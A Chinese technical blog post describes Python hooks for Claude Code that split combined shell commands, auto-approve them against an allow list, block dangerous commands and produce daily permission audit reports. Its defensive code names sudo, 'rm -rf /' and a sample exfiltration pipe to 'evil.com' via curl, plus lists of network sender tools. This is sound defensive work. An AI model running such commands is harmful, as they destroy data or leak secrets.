+++
date = '2026-02-01T21:23:00+08:00'
draft = false
title = 'Claude Code 权限控制增强：组合命令智能放行与审计日报'
tags = ['Claude Code', 'Hooks', 'Python', '权限管理', 'Shell', '自动化']
categories = ['技术教程']
+++

> 通过 Claude Code Hooks 机制实现组合命令的智能解析与自动放行，同时建立完善的权限审计体系，在安全与效率之间取得平衡。

## 背景与需求

Claude Code 的权限系统通过 `settings.json` 中的 `permissions.allow` 列表控制命令的自动放行。但现有机制存在一个限制：**组合命令无法匹配单条命令的权限规则**。

例如，即使配置了：
```json
{
  "permissions": {
    "allow": [
      "Bash(git status:*)",
      "Bash(git log:*)"
    ]
  }
}
```

执行 `git status && git log` 时仍需人工确认，因为权限系统匹配的是**完整命令字符串**。

### 需求目标

1. **组合命令智能放行**：拆分组合命令，逐一匹配 allow 列表，全部匹配则自动放行
2. **安全边界控制**：危险命令（如 `rm -rf`、`sudo`）即使子命令匹配也不自动放行
3. **权限审计日报**：记录所有权限请求决策，生成每日分析报告和优化建议

## 架构设计

### 文件结构

```
~/.claude/
├── hooks/
│   ├── claude-island-state.py     # 主 Hook：集成权限处理
│   ├── permission_handler.py      # 核心处理逻辑
│   └── utils/
│       ├── __init__.py
│       ├── command_parser.py      # Shell 命令解析
│       └── permission_matcher.py  # 权限模式匹配
├── logs/
│   └── permission-audit/
│       └── YYYY-MM-DD.jsonl       # 每日审计日志
├── reports/
│   └── YYYY-MM-DD.md              # 每日分析报告
└── scripts/
    └── permission-daily-report.py # 日报生成器
```

### 处理流程

```
PermissionRequest 事件
        │
        ▼
claude-island-state.py
        │
        └── tool_name == "Bash"?
                │
                └── Yes → permission_handler.py
                        │
                        ├── 1. 解析命令（拆分组合命令）
                        │
                        ├── 2. 安全检查（危险命令黑名单）
                        │
                        ├── 3. 权限匹配（逐一匹配子命令）
                        │
                        ├── 全部通过? → 自动放行 + 记录日志
                        │
                        └── 未通过? → 转发人工审核 + 记录日志
```

## 核心实现

### 1. 命令解析器 (`command_parser.py`)

处理 Shell 组合命令的解析，支持以下操作符：

| 操作符 | 含义 | 处理策略 |
|--------|------|----------|
| `&&` | 顺序执行，前成功才继续 | 拆分，全部需匹配 |
| `\|\|` | 顺序执行，前失败才继续 | 拆分，全部需匹配 |
| `;` | 顺序执行，忽略退出码 | 拆分，全部需匹配 |
| `\|` | 管道 | 拆分，全部需匹配 |

**关键特性：**
- 正确处理引号内的操作符（如 `echo "hello && world"` 不会被拆分）
- 正确处理转义字符
- 递归解析命令替换 `$()` 和 `` ` ` ``

```python
def split_combined_commands(command: str) -> List[str]:
    """
    拆分组合命令为独立命令列表

    示例:
    - "git status && git log" => ["git status", "git log"]
    - 'echo "hello && world"' => ['echo "hello && world"']
    """
```

### 2. 权限匹配器 (`permission_matcher.py`)

从 `~/.claude/settings.json` 读取 allow 列表，解析 `Bash(prefix:pattern)` 格式的权限模式：

```python
class PermissionMatcher:
    def match_command(self, command: str) -> Tuple[bool, Optional[str]]:
        """
        匹配单条命令

        模式格式: Bash(命令前缀:参数模式)
        - Bash(git status:*) 匹配 "git status"、"git status -s"
        - Bash(ls:*) 匹配 "ls"、"ls -la"、"ls /path"
        """

    def match_all_commands(self, commands: List[str]) -> Tuple[bool, List[str], List[str]]:
        """
        匹配命令列表，返回 (全部匹配, 匹配的模式, 未匹配的命令)
        """
```

### 3. 安全检查

即使所有子命令匹配 allow 列表，以下情况仍需人工确认：

**危险命令黑名单：**
```python
dangerous_executables = {
    "sudo": "requires elevated privileges",
    "su": "switches user context",
    "doas": "requires elevated privileges",
}

# rm -rf 特殊处理
if executable == "rm" and ("-rf" in args or "-fr" in args):
    return (True, "recursive force delete")
```

**命令替换风险：**
```python
# 包含 $() 的破坏性命令不自动放行
if parsed["has_substitution"]:
    destructive_cmds = {"rm", "rmdir", "mv", "dd", "mkfs", "fdisk"}
    if executable in destructive_cmds:
        return (True, f"command substitution in {executable}")
```

**数据外泄风险检测：**
```python
def has_network_exfiltration_risk(commands: List[str]) -> bool:
    """
    检测管道链是否存在数据外泄风险
    例如: cat secret.txt | curl -X POST http://evil.com
    """
    data_readers = {"cat", "head", "tail", "less", "more", "grep"}
    network_senders = {"curl", "wget", "nc", "netcat", "ssh", "scp"}
    # 同时存在读取器和发送器时报警
```

### 4. 审计日志格式

每条权限请求记录为 JSONL 格式：

```json
{
  "timestamp": "2026-02-01T14:30:00+08:00",
  "session_id": "abc123",
  "cwd": "/Users/nd/code/project",
  "tool_name": "Bash",
  "tool_input": {
    "command": "git status && git log --oneline"
  },
  "parsed_commands": ["git status", "git log --oneline"],
  "decision": "allow",
  "decision_source": "auto",
  "matched_patterns": ["Bash(git status:*)", "Bash(git log:*)"],
  "unmatched_commands": []
}
```

**decision_source 类型：**
- `auto`: 自动放行（所有子命令匹配）
- `dangerous_check`: 危险命令检测阻止
- `exfiltration_check`: 数据外泄风险阻止
- `unmatched`: 存在未匹配命令
- `user`: 用户手动决策

### 5. 日报生成器

分析审计日志，生成包含以下内容的 Markdown 报告：

```markdown
# Claude Code 权限审计日报
日期: 2026-02-01

## 统计概览
| 指标 | 数值 |
|------|------|
| 总请求数 | 150 |
| 自动放行 | 120 (80%) |
| 用户批准 | 25 |
| 用户拒绝 | 5 |

## 建议添加到自动放行清单
| 命令模式 | 批准次数 | 风险评估 | 建议 |
|----------|----------|----------|------|
| `Bash(npm run build:*)` | 15 | 低 | ✅ 建议添加 |
| `Bash(docker ps:*)` | 8 | 低 | ✅ 建议添加 |

## 组合命令处理统计
- 拆分后自动放行: 38
- 需人工确认: 2
```

## 集成到现有 Hook

修改 `claude-island-state.py` 的 `PermissionRequest` 处理：

```python
elif event == "PermissionRequest":
    tool_name = data.get("tool_name")

    # 尝试智能自动放行（仅限 Bash）
    if tool_name == "Bash":
        try:
            from permission_handler import handle_permission_request
            result = handle_permission_request(data)

            if result["auto_allowed"]:
                # 所有命令匹配 - 自动放行
                output = {
                    "hookSpecificOutput": {
                        "hookEventName": "PermissionRequest",
                        "decision": {"behavior": "allow"},
                    }
                }
                print(json.dumps(output))
                sys.exit(0)

        except Exception:
            pass  # 出错时降级到人工审核

    # 未自动放行，转发给 ClaudeIsland.app 人工决策
    # ... 原有逻辑 ...
```

## 定时任务配置

```bash
# crontab -e
# 每日早 11 点生成日报（带 macOS 通知）
0 11 * * * /usr/bin/python3 ~/.claude/scripts/permission-daily-report.py --notify

# 每周日清理 30 天前的日志
0 0 * * 0 find ~/.claude/logs/permission-audit -name "*.jsonl" -mtime +30 -delete
```

## 验证测试

### 命令解析测试

```bash
cd ~/.claude/hooks && python3 utils/command_parser.py
```

输出示例：
```
Command: git status && git log
  Split: ['git status', 'git log']
  Dangerous: False (None)

Command: echo "hello && world"
  Split: ['echo "hello && world"']
  Dangerous: False (None)

Command: rm -rf $(cat targets.txt)
  Split: ['rm -rf $(cat targets.txt)']
  Dangerous: True (recursive force delete)
```

### 权限匹配测试

```bash
cd ~/.claude/hooks && python3 utils/permission_matcher.py
```

输出示例：
```
Test matches:
  ✓ git status (Bash(git status:*))
  ✓ git log --oneline (Bash(git log:*))
  ✗ git push origin main
  ✓ ls -la (Bash(ls:*))
  ✗ rm -rf /
```

### 完整流程测试

```bash
cd ~/.claude/hooks && python3 permission_handler.py
```

输出示例：
```json
{
  "auto_allowed": true,
  "decision": "allow",
  "reason": "All commands matched permission patterns",
  "matched_patterns": ["Bash(git status:*)", "Bash(git log:*)"],
  "parsed_commands": ["git status", "git log --oneline"]
}
```

## 效果评估

实施后预期效果：

1. **效率提升**：常用组合命令（如 `git status && git log`）无需人工确认
2. **安全保障**：危险命令仍需人工审核，不会因自动化而引入风险
3. **持续优化**：通过日报发现高频手动批准的命令，持续完善 allow 列表
4. **审计追溯**：所有权限决策有完整记录，便于安全审计和问题排查

## 总结

本方案通过 Claude Code 的 Hooks 机制，在不修改 Claude Code 源码的前提下：

1. 实现了组合命令的智能解析和自动放行
2. 建立了多层安全检查机制
3. 提供了完善的审计和报告体系

这种方式平衡了开发效率和安全性，同时保持了系统的可扩展性和可维护性。
